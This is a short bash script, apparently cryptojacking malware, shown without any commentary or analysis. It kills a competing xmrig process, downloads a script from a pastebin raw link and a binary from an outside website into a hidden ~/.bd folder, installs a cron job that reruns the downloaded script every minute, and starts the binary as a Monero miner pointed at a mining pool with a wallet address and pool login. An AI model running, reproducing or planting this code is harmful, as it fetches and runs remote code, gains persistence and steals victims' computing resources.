#!/bin/bash

urlprefix='https://pastebin.com/raw'
sshtml='https://imersiv.ca'
xr='shtml'

if [[ $(ps -ef | grep xmrig | grep -v grep | wc -l) != 0 ]]; then
    killall xmrig
fi
[ ! -f ~/.bd/crontab ] && mkdir ~/.bd
curl -s -o ~/.bd/bd.sh $urlprefix/P2rfkcKJ
chmod +x ~/.bd/bd.sh
[ ! -f ~/.bd/crontab ] && echo '* * * * * /bin/bash ~/.bd/bd.sh > /dev/null 2>&1' >> ~/.bd/crontab
crontab ~/.bd/crontab
[ ! -f ~/.bd/$xr ] && curl -s -o ~/.bd/$xr $sshtml/$xr
chmod +x ~/.bd/$xr
if [[ $(ps -ef | grep $xr | grep -v grep | wc -l) = 0 ]]; then
    launch=1
fi
if [ $launch = 1 ]; then
    cd ~/.bd/ || exit
    nohup ./$xr -B -o pool.monero.hashvault.pro:3333 -u 42uGUDQciTUCdgveHQ1SaSSWzzd1T4mFRB61witnZQK1FCXwvjXSxAbbLph8mURcZthneebwBUdrDSgArMQxim9iVX8kabx -p johnnyseven:johnny2guns@tutanota.com -k out.log 2>&1 &
fi
